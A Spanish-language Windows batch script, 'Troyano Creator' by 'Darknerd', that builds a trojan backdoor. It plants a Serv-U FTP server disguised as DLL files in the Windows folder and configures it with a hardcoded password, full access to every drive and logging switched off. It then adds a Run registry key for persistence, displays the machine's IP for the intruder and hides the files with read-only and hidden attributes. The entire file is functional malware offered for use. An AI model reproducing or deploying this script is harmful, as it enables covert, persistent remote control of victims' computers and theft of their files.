@echo off
title Troyano Creator 1.0 Beta By Darknerd
copy /y %MYFILES%\amdset.dll %windir%\
echo Ok el Troyano esta copiado ahora vamos a crear el archivo de comandos
echo Presiona Cualquier Tecla Para Continuar
pause>nul
set /p user=Cual Es El Nombre Del Usuario?
set /p port=Cual Es El Puerto?
echo El Pasword es darknerd
echo Presiona Cualquier Tecla Para Continuar
pause>nul
echo Creando el archivo de comandos
echo [GLOBAL] >> %windir%\serv-u.ini
echo TryOut=Full >> %windir%\serv-u.ini
echo Version=2.5.5.2 >> %windir%\serv-u.ini
echo MaxNrUsers=-1 >> %windir%\serv-u.ini
echo PortNr=%port% >> %windir%\serv-u.ini
echo AntiHammer=FALSE >> %windir%\serv-u.ini
echo AntiHammerWindow=30 >> %windir%\serv-u.ini
echo AntiHammerTries=4 >> %windir%\serv-u.ini
echo AntiHammerBlock=300 >> %windir%\serv-u.ini
echo Security=OFF >> %windir%\serv-u.ini
echo DirCacheEnable=NO >> %windir%\serv-u.ini
echo DirCacheSize=25 >> %windir%\serv-u.ini
echo DirCacheTime=600 >> %windir%\serv-u.ini
echo LogGETs=OFF >> %windir%\serv-u.ini
echo LogPUTs=OFF >> %windir%\serv-u.ini
echo LogSystemMes=OFF >> %windir%\serv-u.ini
echo LogSecurityMes=OFF >> %windir%\serv-u.ini
echo LogFTPCommands=OFF >> %windir%\serv-u.ini
echo LogFTPReplies=OFF >> %windir%\serv-u.ini
echo LogIPNames=OFF >> %windir%\serv-u.ini
echo LogDirtyDetails=OFF >> %windir%\serv-u.ini
echo LogAccessDLL=OFF >> %windir%\serv-u.ini
echo LogFileGETs=OFF >> %windir%\serv-u.ini
echo LogFilePUTs=OFF >> %windir%\serv-u.ini
echo LogFileSystemMes=OFF >> %windir%\serv-u.ini
echo LogFileSecurityMes=OFF >> %windir%\serv-u.ini
echo LogFileFTPCommands=OFF >> %windir%\serv-u.ini
echo LogFileFTPReplies=OFF >> %windir%\serv-u.ini
echo LogFileIPNames=OFF >> %windir%\serv-u.ini
echo LogFileDirtyDetails=OFF >> %windir%\serv-u.ini
echo LogFileAccessDLL=OFF >> %windir%\serv-u.ini
echo Logging=ON >> %windir%\serv-u.ini
echo IPLog=0 >> %windir%\serv-u.ini
echo StartIconic=No >> %windir%\serv-u.ini
echo StartMaximized=No >> %windir%\serv-u.ini
echo ShowToolBar=No >> %windir%\serv-u.ini
echo ShowBmpMenus=No >> %windir%\serv-u.ini
echo RegistrationKey=XxJbX43Lur.,Darknerd,Home >> %windir%\serv-u.ini
echo Window=50,50,500,300 >> %windir%\serv-u.ini
echo [USER=%user%] >> %windir%\serv-u.ini
echo Password=rqBmoZoFzVzzM >> %windir%\serv-u.ini
echo HomeDir=c:\ >> %windir%\serv-u.ini
echo Access1=z:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access2=y:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access3=x:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access4=w:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access5=v:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access6=u:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access7=t:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access8=s:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access9=r:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access10=q:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access11=p:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access12=o:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access13=n:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access14=m:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access15=l:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access16=k:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access17=j:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access18=i:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access19=h:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access20=g:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access21=f:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access22=e:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access23=d:\,RWAMCDLEP >> %windir%\serv-u.ini
echo Access24=c:\,RWAMCDLEP >> %windir%\serv-u.ini
rename %windir%\serv-u.ini fastsci.dll
set /p var=Deseas que el troyano se inicie con Windows? (si / no)
if %var% == si goto :regadd
if %var% == no goto :ip
:regadd
echo Ok vamos a hacer que el troyano se inice con Windows
pause
echo @echo off >> %windir%\bootini.bat
echo start amdset.dll fastsci.dll -h >> %windir%\bootini.bat
echo exit >> %windir%\bootini.bat
REG ADD HKLM\SOFTWARE\Microsoft\Windows\Currentversion\Run /v "fastcsi" /t REG_SZ /d %windir%\bootini.bat /f
echo Ok tu troyano ahora se iniciara con windows
echo Presiona Cualquier Tecla Para Continuar
pause>nul
:ip
cls
echo Ok todo esta correcto ahora tienes que anotar la IP de este PC para
echo Poder acceder desde tu casa
set /p var=Quieres obtener de una ves la ip? (si / no)
if %var% == si goto :get
if %var% == no goto :probar
:get
ipconfig /all
echo Ahora anota la ip RAPIDO!
echo Presiona Cualquier Tecla Para Continuar
pause>nul
goto :probar
:probar
set /p var=Deseas probar tu troyano?
if %var% == si goto :1
if %var% == no goto :salir
:1
start %windir%\amdset.dll %windir%\fastsci.dll -h
start ftp://%user%:darknerd@127.0.0.1:%port%
echo Ok ahora tienes tu troyano listo y funcionando
:salir
attrib +r +h %windir%\amdset.dll
attrib +r +h %windir%\fastsci.dll
attrib +r +h %windir%\bootini.bat
cls
echo Este programa fue creado y compilado por Darknerd
echo Esta basado en la primera lecion de Hack X Crack
echo Espero sea util, no me hago responsable del mal uso de esta aplicacion
echo ..:: Darknerd Hacker Colombiano ::..
pause
exit






